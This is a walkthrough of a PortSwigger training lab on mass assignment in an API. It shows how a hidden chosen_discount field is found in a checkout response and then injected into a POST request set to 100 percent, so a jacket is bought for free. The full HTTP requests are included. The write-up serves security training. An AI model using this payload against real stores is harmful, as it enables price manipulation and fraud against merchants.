## [Lab-02: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
**Mass Assignment vulnerabilities are present when an attacker is able to overwrite object properties that they should not be able to.**
To solve the lab, find and exploit a mass assignment vulnerability to buy a **Lightweight l33t Leather Jacket**. You can log in to your own account using the following credentials: `wiener:peter`.
almost identical to 1

```
Required knowledge

To solve this lab, you'll need to know:

- What mass assignment is.
- Why mass assignment may result in hidden parameters.
- How to identify hidden parameters.
- How to exploit mass assignment vulnerabilities.
```


### Sign into the app, and run the Content Discovery tool
this will reveal some of the API routes and give you an idea of how it works, and a clue as to what you need to change
try and purchase the jacket and accumulate the following Get request in your history

</br>

- In **Proxy > HTTP history**, notice both the `GET` and `POST` API requests for `/api/checkout`.

```http
GET /api/checkout HTTP/2
Host: 0afa00be0361459380926d9b009b0096.web-security-academy.net
Cookie: session=EWhGuZzEo1xsMTNf4z8SpLQFV9JtnMKw

```

Response
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "name": "Lightweight \"l33t\" Leather Jacket",
      "quantity": 1,
      "item_price": 133700
    }
  ]
}
```
</br>

- the response to the `GET` request contains the same JSON structure as the `POST` request. Observe that the JSON structure in the `GET` response includes a `chosen_discount` parameter, which is not present in the `POST` request.

- Send `POST /api/checkout` request to Repeater, and add the `chosen_discount` parameter to the request. The goal is to get the jacket for free, so edit the json values accordingly

Here is the custom `POST /api/checkout` request
```http
POST /api/checkout HTTP/2
Host: 0a3b0082035c62d780a7c1a100420056.web-security-academy.net
Cookie: session=io2WJLKK9Rva0E8TtRHtWk7y0FpYzSnb
Referer: https://0a3b0082035c62d780a7c1a100420056.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 155

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

After sending this through, the price should now be successfully updated, and the lab solved
